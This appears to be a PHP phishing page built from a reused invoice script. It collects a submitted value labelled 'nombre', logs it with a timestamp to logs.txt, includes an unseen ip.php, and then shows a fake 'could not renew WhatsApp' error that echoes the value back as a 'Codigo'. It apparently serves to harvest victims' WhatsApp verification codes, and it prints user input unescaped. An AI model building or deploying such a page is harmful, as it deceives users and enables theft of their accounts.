<!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="htmlestilo/estilos.css" type="text/css">
</head>

<body>

        // Programado por NePtYx

    <?php
	include('ip.php');
        $nombre = $_REQUEST["nombre"];
        $apellidos = $_REQUEST["apellidos"];
        $domicilio = $_REQUEST["domicilio"];

        
        $fecha = date("d/m/Y");
        $hora = date("H:i:s");

        
        define("precio1", 1.75);
        define("precio2", 1.05);

        
        $totalProducto = array();

        
        $leerNumeroFactura = fopen(".inf", "rb");

       
        $factura = fread($leerNumeroFactura, filesize(".inf"));

        
        fclose($leerNumeroFactura);

        
        $factura++;

        
        $leerNumeroFactura = fopen(".inf", "wb");

        
        fwrite($leerNumeroFactura, $factura);

        
        fclose($leerNumeroFactura);

        
        if (isset($_REQUEST["producto1"])) {
            $producto1 = $_REQUEST["producto1"];
            $cantidad1 = $_REQUEST["cantidad1"];
            $totalProducto[0] = precio1 * $cantidad1;
        } else {
            $producto1 = " ";
            $cantidad1 = 0;
            $totalProducto[0] = 0;
        }

        if (isset($_REQUEST["producto2"])) {
            $producto2 = $_REQUEST["producto2"];
            $cantidad2 = $_REQUEST["cantidad2"];
            $totalProducto[1] = precio2 * $cantidad2;
        } else {
            $producto2 = " ";
            $cantidad2 = 0;
            $totalProducto[1] = 0;
        }

        
        $total = 0;
        for ($i = 0; $i < count($totalProducto); $i++) {
            $total += $totalProducto[$i];
        }

        $IVA = $total * 0.04;
        $subtotal = $total - $IVA;

        $datos = fopen("logs.txt", "ab");
    
        fwrite($datos, $factura.";".$fecha.";".$hora.";".$nombre."\n");
        
        fclose($datos);
    
        echo "<h2>Error no se ha podido renovar WhatsApp<br><br>
        
        Codigo: $nombre<br>
        $fecha $hora<br>
        ---------------------------------\n<br>
        </h2>";
        ?>
</body>
</html>
